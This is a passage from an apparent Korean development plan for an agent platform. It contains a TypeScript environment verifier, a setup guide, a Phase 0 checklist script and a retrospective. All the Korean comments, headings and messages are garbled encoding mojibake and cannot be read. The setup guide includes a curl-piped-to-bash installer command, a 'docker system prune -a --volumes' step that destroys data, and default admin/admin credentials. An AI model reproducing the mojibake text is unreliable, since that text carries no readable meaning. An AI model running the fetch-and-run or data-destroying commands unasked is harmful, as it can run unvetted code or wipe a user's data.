        this.addResult(tool.name, 'pass', stdout.trim().split('\n')[0]);
      } catch {
        if (tool.optional) {
          this.addResult(tool.name, 'warning', 'ì„¤ì¹˜ë˜ì§€ ì•ŠìŒ (ì„ íƒì‚¬í•­)');
        } else {
          this.addResult(tool.name, 'fail', 'ì„¤ì¹˜ë˜ì§€ ì•ŠìŒ');
        }
      }
    }
  }
  
  private async verifySecuritySettings(): Promise<void> {
    // í™˜ê²½ ë³€ìˆ˜ ë³´ì•ˆ
    const sensitiveVars = ['JWT_SECRET', 'ENCRYPTION_KEY'];
    const weakValues = ['secret', 'password', '123456', 'admin'];
    
    for (const varName of sensitiveVars) {
      const value = process.env[varName];
      if (!value) {
        this.addResult(`ë³´ì•ˆ: ${varName}`, 'fail', 'ì„¤ì •ë˜ì§€ ì•ŠìŒ');
      } else if (weakValues.includes(value.toLowerCase())) {
        this.addResult(`ë³´ì•ˆ: ${varName}`, 'fail', 'ì•½í•œ ê°’ ì‚¬ìš©');
      } else if (value.length < 16) {
        this.addResult(`ë³´ì•ˆ: ${varName}`, 'warning', '16ì ì´ìƒ ê¶Œì¥');
      } else {
        this.addResult(`ë³´ì•ˆ: ${varName}`, 'pass', 'ì ì ˆí•œ ê°’ ì„¤ì •ë¨');
      }
    }
    
    // .env íŒŒì¼ ê¶Œí•œ í™•ì¸
    try {
      const stats = await fs.stat('.env');
      const mode = (stats.mode & parseInt('777', 8)).toString(8);
      if (mode === '600') {
        this.addResult('.env íŒŒì¼ ê¶Œí•œ', 'pass', 'ì•ˆì „í•œ ê¶Œí•œ ì„¤ì • (600)');
      } else {
        this.addResult('.env íŒŒì¼ ê¶Œí•œ', 'warning', `í˜„ì¬ ê¶Œí•œ: ${mode} (600 ê¶Œì¥)`);
      }
    } catch {
      this.addResult('.env íŒŒì¼', 'fail', '.env íŒŒì¼ì´ ì—†ìŠµë‹ˆë‹¤');
    }
  }
  
  private addResult(component: string, status: VerificationResult['status'], message: string, details?: any): void {
    this.results.push({ component, status, message, details });
  }
  
  private printResults(): void {
    console.log('\n' + chalk.blue('='.repeat(60)));
    console.log(chalk.blue.bold('ê²€ì¦ ê²°ê³¼ ìš”ì•½'));
    console.log(chalk.blue('='.repeat(60)) + '\n');
    
    const statusIcons = {
      pass: chalk.green('âœ…'),
      fail: chalk.red('âŒ'),
      warning: chalk.yellow('âš ï¸')
    };
    
    const maxComponentLength = Math.max(...this.results.map(r => r.component.length));
    
    for (const result of this.results) {
      const icon = statusIcons[result.status];
      const component = result.component.padEnd(maxComponentLength + 2);
      const statusColor = result.status === 'pass' ? chalk.green :
                         result.status === 'fail' ? chalk.red : chalk.yellow;
      
      console.log(`${icon} ${chalk.white(component)} ${statusColor(result.message)}`);
      
      if (result.details && process.env.VERBOSE) {
        console.log(chalk.gray(`   ìƒì„¸: ${JSON.stringify(result.details, null, 2)}`));
      }
    }
    
    // í†µê³„
    const stats = {
      pass: this.results.filter(r => r.status === 'pass').length,
      fail: this.results.filter(r => r.status === 'fail').length,
      warning: this.results.filter(r => r.status === 'warning').length
    };
    
    console.log('\n' + chalk.blue('-'.repeat(60)));
    console.log(chalk.white('í†µê³„:'), 
      chalk.green(`ì„±ê³µ: ${stats.pass}`),
      chalk.red(`ì‹¤íŒ¨: ${stats.fail}`),
      chalk.yellow(`ê²½ê³ : ${stats.warning}`)
    );
    
    if (stats.fail > 0) {
      console.log('\n' + chalk.red.bold('âš ï¸  ì¼ë¶€ ê²€ì¦ì´ ì‹¤íŒ¨í–ˆìŠµë‹ˆë‹¤. ìœ„ì˜ ì‹¤íŒ¨ í•­ëª©ì„ í™•ì¸í•˜ì„¸ìš”.'));
      process.exit(1);
    } else if (stats.warning > 0) {
      console.log('\n' + chalk.yellow.bold('â„¹ï¸  ì¼ë¶€ ê²½ê³ ê°€ ìˆì§€ë§Œ ê°œë°œì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.'));
    } else {
      console.log('\n' + chalk.green.bold('ğŸ‰ ëª¨ë“  ê²€ì¦ì„ í†µê³¼í–ˆìŠµë‹ˆë‹¤! ê°œë°œ í™˜ê²½ì´ ì¤€ë¹„ë˜ì—ˆìŠµë‹ˆë‹¤.'));
    }
  }
}

// ì‹¤í–‰
if (require.main === module) {
  const verifier = new EnvironmentVerifier();
  verifier.verify().catch(console.error);
}

export { EnvironmentVerifier };
```

### SubTask 0.14.3: ê°œë°œ í™˜ê²½ ì„¤ì • ë¬¸ì„œí™”
**ëª©í‘œ**: ì™„ì„±ëœ ê°œë°œ í™˜ê²½ ì„¤ì •ì„ ë¬¸ì„œë¡œ ì •ë¦¬

**êµ¬í˜„ ë‚´ìš©**:
```markdown
<!-- docs/setup/development-environment.md -->
# T-Developer ê°œë°œ í™˜ê²½ ì„¤ì • ê°€ì´ë“œ

## ğŸ“‹ ëª©ì°¨
1. [ì‹œìŠ¤í…œ ìš”êµ¬ì‚¬í•­](#ì‹œìŠ¤í…œ-ìš”êµ¬ì‚¬í•­)
2. [í•„ìˆ˜ ë„êµ¬ ì„¤ì¹˜](#í•„ìˆ˜-ë„êµ¬-ì„¤ì¹˜)
3. [í”„ë¡œì íŠ¸ ì„¤ì •](#í”„ë¡œì íŠ¸-ì„¤ì •)
4. [í™˜ê²½ ë³€ìˆ˜ êµ¬ì„±](#í™˜ê²½-ë³€ìˆ˜-êµ¬ì„±)
5. [AWS ì„œë¹„ìŠ¤ ì„¤ì •](#aws-ì„œë¹„ìŠ¤-ì„¤ì •)
6. [ë¡œì»¬ ê°œë°œ í™˜ê²½](#ë¡œì»¬-ê°œë°œ-í™˜ê²½)
7. [ê²€ì¦ ë° í…ŒìŠ¤íŠ¸](#ê²€ì¦-ë°-í…ŒìŠ¤íŠ¸)
8. [ë¬¸ì œ í•´ê²°](#ë¬¸ì œ-í•´ê²°)

## ì‹œìŠ¤í…œ ìš”êµ¬ì‚¬í•­

### í•˜ë“œì›¨ì–´
- **CPU**: 4ì½”ì–´ ì´ìƒ ê¶Œì¥
- **RAM**: 16GB ì´ìƒ ê¶Œì¥
- **ë””ìŠ¤í¬**: 50GB ì´ìƒ ì—¬ìœ  ê³µê°„

### ìš´ì˜ì²´ì œ
- macOS 12.0+
- Ubuntu 20.04+
- Windows 10/11 (WSL2 í•„ìˆ˜)

## í•„ìˆ˜ ë„êµ¬ ì„¤ì¹˜

### 1. Node.js (v18+)
```bash
# NVM ì‚¬ìš© (ê¶Œì¥)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
nvm install 18
nvm use 18

# ì§ì ‘ ì„¤ì¹˜
# https://nodejs.org/en/download/
```

### 2. Python (v3.9+)
```bash
# macOS
brew install python@3.9

# Ubuntu
sudo apt update
sudo apt install python3.9 python3.9-venv

# Windows
# https://www.python.org/downloads/
```

### 3. AWS CLI
```bash
# macOS
brew install awscli

# Linux/WSL
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# ì„¤ì •
aws configure
```

### 4. Docker
```bash
# macOS
brew install --cask docker

# Ubuntu
sudo apt install docker.io docker-compose
sudo usermod -aG docker $USER

# Windows
# Docker Desktop ì„¤ì¹˜: https://www.docker.com/products/docker-desktop
```

### 5. Git
```bash
# macOS
brew install git

# Ubuntu
sudo apt install git
```

## í”„ë¡œì íŠ¸ ì„¤ì •

### 1. ì €ì¥ì†Œ í´ë¡ 
```bash
git clone https://github.com/your-org/t-developer.git
cd t-developer
```

### 2. ì˜ì¡´ì„± ì„¤ì¹˜
```bash
# ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì—ì„œ
npm install

# Backend ì˜ì¡´ì„±
cd backend
npm install

# Frontend ì˜ì¡´ì„±
cd ../frontend
npm install
```

### 3. Git Hooks ì„¤ì •
```bash
# ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì—ì„œ
npm run prepare
```

## í™˜ê²½ ë³€ìˆ˜ êµ¬ì„±

### 1. í™˜ê²½ ë³€ìˆ˜ íŒŒì¼ ìƒì„±
```bash
# ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì—ì„œ
cp .env.example .env

# ë³´ì•ˆ ì„¤ì •
chmod 600 .env
```

### 2. í•„ìˆ˜ í™˜ê²½ ë³€ìˆ˜ ì„¤ì •
```bash
# .env íŒŒì¼ í¸ì§‘
nano .env  # ë˜ëŠ” ì›í•˜ëŠ” ì—ë””í„° ì‚¬ìš©
```

#### í•„ìˆ˜ ì„¤ì • í•­ëª©:
```env
# Node í™˜ê²½
NODE_ENV=development
PORT=3000

# AWS ì„¤ì •
AWS_ACCESS_KEY_ID=your-access-key
AWS_SECRET_ACCESS_KEY=your-secret-key
AWS_REGION=us-east-1

# AI ì„œë¹„ìŠ¤ (ìµœì†Œ í•˜ë‚˜ í•„ìˆ˜)
OPENAI_API_KEY=sk-...
# ë˜ëŠ”
ANTHROPIC_API_KEY=sk-ant-...

# ë³´ì•ˆ (ê°•ë ¥í•œ ê°’ìœ¼ë¡œ ë³€ê²½ í•„ìˆ˜!)
JWT_SECRET=your-super-secure-jwt-secret-min-32-chars
ENCRYPTION_KEY=your-32-character-encryption-key!!

# GitHub (ì„ íƒì‚¬í•­)
GITHUB_TOKEN=ghp_...
```

## AWS ì„œë¹„ìŠ¤ ì„¤ì •

### 1. DynamoDB í…Œì´ë¸” ìƒì„±
```bash
# ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
npm run setup:aws:dynamodb
```

### 2. S3 ë²„í‚· ìƒì„±
```bash
# ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
npm run setup:aws:s3
```

### 3. Bedrock ì„¤ì • (ì„ íƒì‚¬í•­)
```bash
# Bedrock ì•¡ì„¸ìŠ¤ í™œì„±í™”
aws bedrock get-foundation-model-availability \
  --region us-east-1 \
  --model-id anthropic.claude-v2
```

## ë¡œì»¬ ê°œë°œ í™˜ê²½

### 1. ë¡œì»¬ ì„œë¹„ìŠ¤ ì‹œì‘
```bash
# Docker Composeë¡œ ëª¨ë“  ì„œë¹„ìŠ¤ ì‹œì‘
docker-compose up -d

# ê°œë³„ ì„œë¹„ìŠ¤ ì‹œì‘
docker-compose up -d dynamodb-local
docker-compose up -d redis
```

### 2. ë°ì´í„°ë² ì´ìŠ¤ ì´ˆê¸°í™”
```bash
# DynamoDB ë¡œì»¬ í…Œì´ë¸” ìƒì„±
npm run db:init:local
```

### 3. ê°œë°œ ì„œë²„ ì‹œì‘
```bash
# Backend (í„°ë¯¸ë„ 1)
cd backend
npm run dev

# Frontend (í„°ë¯¸ë„ 2)
cd frontend
npm run dev
```

### 4. ì„œë¹„ìŠ¤ ì ‘ì†
- **Frontend**: http://localhost:5173
- **Backend API**: http://localhost:3000
- **API ë¬¸ì„œ**: http://localhost:3000/api-docs
- **Grafana**: http://localhost:3001 (admin/admin)

## ê²€ì¦ ë° í…ŒìŠ¤íŠ¸

### 1. í™˜ê²½ ê²€ì¦
```bash
# ì „ì²´ í™˜ê²½ ê²€ì¦
npm run verify:env

# ìƒì„¸ ì •ë³´ í¬í•¨
VERBOSE=true npm run verify:env
```

### 2. í…ŒìŠ¤íŠ¸ ì‹¤í–‰
```bash
# ë‹¨ìœ„ í…ŒìŠ¤íŠ¸
npm test

# í†µí•© í…ŒìŠ¤íŠ¸
npm run test:integration

# E2E í…ŒìŠ¤íŠ¸
npm run test:e2e
```

### 3. ë¦°íŠ¸ ë° í¬ë§·íŒ…
```bash
# ë¦°íŠ¸ ê²€ì‚¬
npm run lint

# ìë™ ìˆ˜ì •
npm run lint:fix

# ì½”ë“œ í¬ë§·íŒ…
npm run format
```

## ë¬¸ì œ í•´ê²°

### í¬íŠ¸ ì¶©ëŒ
```bash
# ì‚¬ìš© ì¤‘ì¸ í¬íŠ¸ í™•ì¸
lsof -i :3000
lsof -i :5173

# í”„ë¡œì„¸ìŠ¤ ì¢…ë£Œ
kill -9 <PID>
```

### Docker ë¬¸ì œ
```bash
# Docker ì¬ì‹œì‘
docker-compose down
docker-compose up -d

# ë³¼ë¥¨ ì •ë¦¬
docker system prune -a --volumes
```

### ê¶Œí•œ ë¬¸ì œ
```bash
# node_modules ê¶Œí•œ ìˆ˜ì •
sudo chown -R $(whoami) node_modules

# npm ìºì‹œ ì •ë¦¬
npm cache clean --force
```

### AWS ì—°ê²° ë¬¸ì œ
```bash
# ìê²© ì¦ëª… í™•ì¸
aws sts get-caller-identity

# ë¦¬ì „ í™•ì¸
echo $AWS_REGION
```

## ë‹¤ìŒ ë‹¨ê³„

ê°œë°œ í™˜ê²½ ì„¤ì •ì´ ì™„ë£Œë˜ì—ˆë‹¤ë©´:

1. [ì•„í‚¤í…ì²˜ ë¬¸ì„œ](../architecture/overview.md) ì½ê¸°
2. [ê°œë°œ ê°€ì´ë“œ](../development/getting-started.md) í™•ì¸
3. [ì²« ë²ˆì§¸ ì—ì´ì „íŠ¸ ë§Œë“¤ê¸°](../tutorials/first-agent.md)

---

ë¬¸ì œê°€ ìˆê±°ë‚˜ ë„ì›€ì´ í•„ìš”í•˜ë©´ [ì´ìŠˆ íŠ¸ë˜ì»¤](https://github.com/your-org/t-developer/issues)ì— ë¬¸ì˜í•˜ì„¸ìš”.
```

### SubTask 0.14.4: Phase 0 ì™„ë£Œ ì²´í¬ë¦¬ìŠ¤íŠ¸
**ëª©í‘œ**: Phase 0ì˜ ëª¨ë“  ì‘ì—…ì´ ì™„ë£Œë˜ì—ˆëŠ”ì§€ ìµœì¢… í™•ì¸

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// scripts/phase0-checklist.ts
import fs from 'fs/promises';
import path from 'path';
import chalk from 'chalk';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

interface ChecklistItem {
  task: string;
  description: string;
  check: () => Promise<boolean>;
  critical: boolean;
}

class Phase0Checklist {
  private items: ChecklistItem[] = [
    // Task 0.1: ê°œë°œ í™˜ê²½ ì´ˆê¸° ì„¤ì •
    {
      task: '0.1.1',
      description: 'í•„ìˆ˜ ë„êµ¬ ì„¤ì¹˜ í™•ì¸',
      check: async () => {
        try {
          await execAsync('node --version');
          await execAsync('npm --version');
          await execAsync('aws --version');
          await execAsync('docker --version');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.1.2',
      description: 'í”„ë¡œì íŠ¸ êµ¬ì¡° ìƒì„±',
      check: async () => {
        const dirs = ['backend', 'frontend', 'infrastructure', 'docs'];
        for (const dir of dirs) {
          try {
            await fs.access(dir);
          } catch {
            return false;
          }
        }
        return true;
      },
      critical: true
    },
    {
      task: '0.1.3',
      description: 'Git ì €ì¥ì†Œ ì´ˆê¸°í™”',
      check: async () => {
        try {
          await fs.access('.git');
          await fs.access('.gitignore');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.1.4',
      description: 'í™˜ê²½ ë³€ìˆ˜ í…œí”Œë¦¿',
      check: async () => {
        try {
          await fs.access('.env.example');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    
    // Task 0.2: AWS ê¸°ë³¸ ì„¤ì •
    {
      task: '0.2.1',
      description: 'AWS ê³„ì • ë° ê¶Œí•œ ì„¤ì •',
      check: async () => {
        try {
          const { stdout } = await execAsync('aws sts get-caller-identity');
          return stdout.includes('UserId');
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.2.3',
      description: 'DynamoDB í…Œì´ë¸” ì„¤ê³„',
      check: async () => {
        try {
          await fs.access('infrastructure/dynamodb/schemas');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.3: í”„ë¡œì íŠ¸ ì˜ì¡´ì„± ì„¤ì •
    {
      task: '0.3.1',
      description: 'Backend íŒ¨í‚¤ì§€ ì„¤ì •',
      check: async () => {
        try {
          await fs.access('backend/package.json');
          await fs.access('backend/tsconfig.json');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    {
      task: '0.3.2',
      description: 'Frontend íŒ¨í‚¤ì§€ ì„¤ì •',
      check: async () => {
        try {
          await fs.access('frontend/package.json');
          await fs.access('frontend/vite.config.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    
    // Task 0.4: ë³´ì•ˆ ë° ì¸ì¦ ê¸°ì´ˆ ì„¤ì •
    {
      task: '0.4.1',
      description: 'í™˜ê²½ ë³€ìˆ˜ ì•”í˜¸í™”',
      check: async () => {
        try {
          await fs.access('backend/src/utils/crypto.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.5: ê°œë°œ ë„êµ¬ ì„¤ì •
    {
      task: '0.5.1',
      description: 'ESLint ì„¤ì •',
      check: async () => {
        try {
          await fs.access('.eslintrc.js');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    {
      task: '0.5.2',
      description: 'Prettier ì„¤ì •',
      check: async () => {
        try {
          await fs.access('.prettierrc');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.6: í…ŒìŠ¤íŠ¸ í™˜ê²½ ì„¤ì •
    {
      task: '0.6.1',
      description: 'Jest ì„¤ì •',
      check: async () => {
        try {
          await fs.access('backend/jest.config.js');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.7: CI/CD íŒŒì´í”„ë¼ì¸ ê¸°ì´ˆ
    {
      task: '0.7.1',
      description: 'GitHub Actions ì›Œí¬í”Œë¡œìš°',
      check: async () => {
        try {
          await fs.access('.github/workflows');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.8: ë¬¸ì„œí™” ê¸°ë°˜
    {
      task: '0.8.1',
      description: 'ë¬¸ì„œ êµ¬ì¡°',
      check: async () => {
        try {
          await fs.access('docs');
          const files = await fs.readdir('docs');
          return files.length > 0;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.9: ë¡œì»¬ ê°œë°œ í™˜ê²½
    {
      task: '0.9.1',
      description: 'Docker Compose ì„¤ì •',
      check: async () => {
        try {
          await fs.access('docker-compose.yml');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.10: ë³´ì•ˆ ê°•í™”
    {
      task: '0.10.1',
      description: 'ë³´ì•ˆ ë¯¸ë“¤ì›¨ì–´',
      check: async () => {
        try {
          await fs.access('backend/src/middleware/security.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.11: ëª¨ë‹ˆí„°ë§ ê¸°ì´ˆ
    {
      task: '0.11.1',
      description: 'ë¡œê¹… ì‹œìŠ¤í…œ',
      check: async () => {
        try {
          await fs.access('backend/src/config/logger.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.12: ê°œë°œ íš¨ìœ¨ì„± ë„êµ¬
    {
      task: '0.12.1',
      description: 'ì½”ë“œ ìƒì„±ê¸°',
      check: async () => {
        try {
          await fs.access('scripts/generators');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    },
    
    // Task 0.13: ì—ì´ì „íŠ¸ ê°œë°œ í™˜ê²½
    {
      task: '0.13.1',
      description: 'ì—ì´ì „íŠ¸ í”„ë ˆì„ì›Œí¬',
      check: async () => {
        try {
          await fs.access('backend/src/agents/framework/base-agent.ts');
          return true;
        } catch {
          return false;
        }
      },
      critical: true
    },
    
    // Task 0.14: Phase 0 ë§ˆë¬´ë¦¬
    {
      task: '0.14.1',
      description: 'í†µí•© í…ŒìŠ¤íŠ¸',
      check: async () => {
        try {
          const { stdout } = await execAsync('npm test -- --passWithNoTests');
          return true;
        } catch {
          return false;
        }
      },
      critical: false
    }
  ];
  
  async run(): Promise<void> {
    console.log(chalk.blue.bold('\nğŸ” Phase 0 ì™„ë£Œ ì²´í¬ë¦¬ìŠ¤íŠ¸\n'));
    console.log(chalk.gray('='.repeat(60)) + '\n');
    
    let passCount = 0;
    let criticalFailCount = 0;
    
    for (const item of this.items) {
      const result = await item.check();
      const icon = result ? chalk.green('âœ…') : chalk.red('âŒ');
      const taskColor = result ? chalk.green : chalk.red;
      
      console.log(
        `${icon} ${chalk.gray(`[${item.task}]`)} ${taskColor(item.description)}` +
        (item.critical && !result ? chalk.red(' (í•„ìˆ˜)') : '')
      );
      
      if (result) {
        passCount++;
      } else if (item.critical) {
        criticalFailCount++;
      }
    }
    
    // ê²°ê³¼ ìš”ì•½
    console.log('\n' + chalk.gray('='.repeat(60)));
    console.log(chalk.blue.bold('\nğŸ“Š ê²°ê³¼ ìš”ì•½\n'));
    
    const totalItems = this.items.length;
    const completionRate = Math.round((passCount / totalItems) * 100);
    
    console.log(`ì™„ë£Œ: ${chalk.green(passCount)}/${totalItems} (${completionRate}%)`);
    console.log(`í•„ìˆ˜ í•­ëª© ì‹¤íŒ¨: ${chalk.red(criticalFailCount)}`);
    
    if (criticalFailCount > 0) {
      console.log('\n' + chalk.red.bold('âŒ Phase 0ë¥¼ ì™„ë£Œí•˜ê¸° ì „ì— í•„ìˆ˜ í•­ëª©ì„ í•´ê²°í•´ì•¼ í•©ë‹ˆë‹¤.'));
    } else if (passCount === totalItems) {
      console.log('\n' + chalk.green.bold('ğŸ‰ ì¶•í•˜í•©ë‹ˆë‹¤! Phase 0ê°€ ì™„ë²½í•˜ê²Œ ì™„ë£Œë˜ì—ˆìŠµë‹ˆë‹¤!'));
      console.log(chalk.green('ì´ì œ Phase 1ë¡œ ì§„í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.'));
    } else {
      console.log('\n' + chalk.yellow.bold('âš ï¸  Phase 0ì˜ í•„ìˆ˜ í•­ëª©ì€ ì™„ë£Œë˜ì—ˆì§€ë§Œ ì¼ë¶€ ì„ íƒ í•­ëª©ì´ ë‚¨ì•„ìˆìŠµë‹ˆë‹¤.'));
      console.log(chalk.yellow('Phase 1ë¡œ ì§„í–‰í•  ìˆ˜ ìˆì§€ë§Œ, ë‚˜ì¤‘ì— ì™„ë£Œí•˜ëŠ” ê²ƒì„ ê¶Œì¥í•©ë‹ˆë‹¤.'));
    }
    
    // ë‹¤ìŒ ë‹¨ê³„ ì•ˆë‚´
    console.log('\n' + chalk.blue.bold('ğŸ“Œ ë‹¤ìŒ ë‹¨ê³„:'));
    console.log(chalk.gray('1. ë‚¨ì€ í•­ëª© ì™„ë£Œ (ì„ íƒì‚¬í•­)'));
    console.log(chalk.gray('2. Phase 1: ì½”ì–´ ì¸í”„ë¼ êµ¬ì¶• ì‹œì‘'));
    console.log(chalk.gray('   - npm run phase1:start'));
  }
}

// ì‹¤í–‰
if (require.main === module) {
  const checklist = new Phase0Checklist();
  checklist.run().catch(console.error);
}

export { Phase0Checklist };
```

## Task 0.15: Phase 0 ì™„ë£Œ ë° Phase 1 ì¤€ë¹„

### SubTask 0.15.1: Phase 0 í•™ìŠµ ì •ë¦¬
**ëª©í‘œ**: Phase 0ì—ì„œ ì–»ì€ êµí›ˆê³¼ ê°œì„ ì  ì •ë¦¬

**êµ¬í˜„ ë‚´ìš©**:
```markdown
<!-- docs/phases/phase0-retrospective.md -->
# Phase 0 íšŒê³  ë° í•™ìŠµ ì •ë¦¬

## ğŸ“Š Phase 0 ê°œìš”
- **ê¸°ê°„**: [ì‹œì‘ì¼] ~ [ì¢…ë£Œì¼]
- **ëª©í‘œ**: T-Developer ê°œë°œì„ ìœ„í•œ ê¸°ë°˜ í™˜ê²½ êµ¬ì¶•
- **ì£¼ìš” ì„±ê³¼**: 15ê°œ Tasks, 60+ SubTasks ì™„ë£Œ

## âœ… ì™„ë£Œëœ ì£¼ìš” ì‘ì—…

### 1. ê°œë°œ í™˜ê²½
- âœ… Node.js 18+ ê¸°ë°˜ TypeScript í™˜ê²½ êµ¬ì¶•
- âœ… ëª¨ë…¸ë ˆí¬ êµ¬ì¡° ì„¤ì • (backend/frontend/infrastructure)
- âœ… Git ì›Œí¬í”Œë¡œìš° ë° hooks ì„¤ì •
- âœ… í™˜ê²½ ë³€ìˆ˜ ê´€ë¦¬ ì²´ê³„ êµ¬ì¶•

### 2. AWS ì¸í”„ë¼
- âœ… AWS ê³„ì • ë° IAM ê¶Œí•œ ì„¤ì •
- âœ… DynamoDB ìŠ¤í‚¤ë§ˆ ì„¤ê³„
- âœ… S3 ë²„í‚· êµ¬ì¡° ì„¤ê³„
- âœ… ë¡œì»¬ ê°œë°œìš© AWS ì„œë¹„ìŠ¤ ì—ë®¬ë ˆì´ì…˜

### 3. ê°œë°œ ë„êµ¬
- âœ… ESLint/Prettier ì½”ë“œ í’ˆì§ˆ ë„êµ¬
- âœ… Jest ê¸°ë°˜ í…ŒìŠ¤íŠ¸ í™˜ê²½
- âœ… Docker Compose ë¡œì»¬ í™˜ê²½
- âœ… CI/CD íŒŒì´í”„ë¼ì¸ ê¸°ì´ˆ

### 4. ë³´ì•ˆ ë° ëª¨ë‹ˆí„°ë§
- âœ… ë³´ì•ˆ ë¯¸ë“¤ì›¨ì–´ êµ¬í˜„
- âœ… í™˜ê²½ ë³€ìˆ˜ ì•”í˜¸í™”
- âœ… ë¡œê¹… ë° ë©”íŠ¸ë¦­ ìˆ˜ì§‘ ê¸°ë°˜
- âœ… ì…ë ¥ ê²€ì¦ ë° ì‚´ê· 

### 5. ì—ì´ì „íŠ¸ í”„ë ˆì„ì›Œí¬
- âœ… BaseAgent ì¶”ìƒ í´ë˜ìŠ¤
- âœ… ì—ì´ì „íŠ¸ ê°„ í†µì‹  í”„ë¡œí† ì½œ
- âœ… AWS Bedrock/Agent Squad í†µí•© ì¤€ë¹„
- âœ… Agno ëª¨ë‹ˆí„°ë§ í†µí•© ì¤€ë¹„

## ğŸ“š ì£¼ìš” í•™ìŠµ ì‚¬í•­

### 1. ì•„í‚¤í…ì²˜ ê²°ì •
- **ëª¨ë…¸ë ˆí¬ ì ‘ê·¼**: Nx ì—†ì´ë„ npm workspacesë¡œ ì¶©ë¶„
- **TypeScript ì„¤ì •**: strict ëª¨ë“œê°€ ì´ˆê¸°ì—” ë²ˆê±°ë¡­ì§€ë§Œ ì¥ê¸°ì ìœ¼ë¡œ ìœ ë¦¬
- **Docker í™œìš©**: ë¡œì»¬ ê°œë°œ í™˜ê²½ ì¼ê´€ì„± í™•ë³´ì— í•„ìˆ˜

### 2. AWS ì„œë¹„ìŠ¤
- **DynamoDB**: ë‹¨ì¼ í…Œì´ë¸” ì„¤ê³„ê°€ ë³µì¡í•˜ì§€ë§Œ ì„±ëŠ¥ìƒ ì´ì 
- **ë¡œì»¬ ì—ë®¬ë ˆì´ì…˜**: LocalStackë³´ë‹¤ ê°œë³„ ì„œë¹„ìŠ¤ ì»¨í…Œì´ë„ˆê°€ ì•ˆì •ì 
- **IAM ê¶Œí•œ**: ìµœì†Œ ê¶Œí•œ ì›ì¹™ ì¤€ìˆ˜ì˜ ì¤‘ìš”ì„±

### 3. ê°œë°œ í”„ë¡œì„¸ìŠ¤
- **ìë™í™”ì˜ ê°€ì¹˜**: ë°˜ë³µ ì‘ì—…ì€ ì¦‰ì‹œ ìŠ¤í¬ë¦½íŠ¸í™”
- **ë¬¸ì„œí™”**: ì½”ë“œì™€ í•¨ê»˜ ë¬¸ì„œë„ ë™ì‹œ ì‘ì„±ì´ íš¨ìœ¨ì 
- **í…ŒìŠ¤íŠ¸ ìš°ì„ **: TDDëŠ” ì•„ë‹ˆë”ë¼ë„ í…ŒìŠ¤íŠ¸ ê°€ëŠ¥í•œ êµ¬ì¡° ì„¤ê³„ í•„ìˆ˜

## ğŸ”§ ê°œì„  í•„ìš” ì‚¬í•­

### 1. ì„±ëŠ¥ ìµœì í™”
- [ ] ë¹Œë“œ ì‹œê°„ ë‹¨ì¶• (í˜„ì¬ 3ë¶„ â†’ ëª©í‘œ 1ë¶„)
- [ ] í…ŒìŠ¤íŠ¸ ë³‘ë ¬í™”ë¡œ ì‹¤í–‰ ì‹œê°„ ê°œì„ 
- [ ] Docker ì´ë¯¸ì§€ í¬ê¸° ìµœì í™”

### 2. ê°œë°œì ê²½í—˜
- [ ] ë” ë‚˜ì€ ì—ëŸ¬ ë©”ì‹œì§€
- [ ] ìë™ ì™„ì„± ë° IntelliSense ê°œì„ 
- [ ] ë””ë²„ê¹… í™˜ê²½ ê°•í™”

### 3. ë¬¸ì„œí™”
- [ ] API ë¬¸ì„œ ìë™ ìƒì„± ê°œì„ 
- [ ] ì¸í„°ë™í‹°ë¸Œ íŠœí† ë¦¬ì–¼ ì¶”ê°€
- [ ] ë¹„ë””ì˜¤ ê°€ì´ë“œ ì œì‘

## ğŸ’¡ Phase 1ì„ ìœ„í•œ ì œì•ˆ

### 1. ìš°ì„ ìˆœìœ„
1. **ì½”ì–´ ì—ì´ì „íŠ¸ ì‹œìŠ¤í…œ**: BaseAgentë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ ì‹¤ì œ êµ¬í˜„
2. **ë°ì´í„° ë ˆì´ì–´**: DynamoDB í†µí•© ë° ìºì‹± ì „ëµ
3. **API Gateway**: RESTful API ë° WebSocket êµ¬í˜„

### 2. ìœ„í—˜ ìš”ì†Œ
- **Bedrock í†µí•©**: API ì œí•œ ë° ë¹„ìš© ê´€ë¦¬ í•„ìš”
- **ë©€í‹° ì—ì´ì „íŠ¸ ì¡°ì •**: ë³µì¡ë„ ê´€ë¦¬ ì „ëµ í•„ìš”
- **ì‹¤ì‹œê°„ í†µì‹ **: WebSocket ì—°ê²° ì•ˆì •ì„±

### 3. ì„±ê³µ ì§€í‘œ
- ì²« ë²ˆì§¸ ì—ì´ì „íŠ¸ ë™ì‘ í™•ì¸
- ê¸°ë³¸ API ì—”ë“œí¬ì¸íŠ¸ êµ¬í˜„
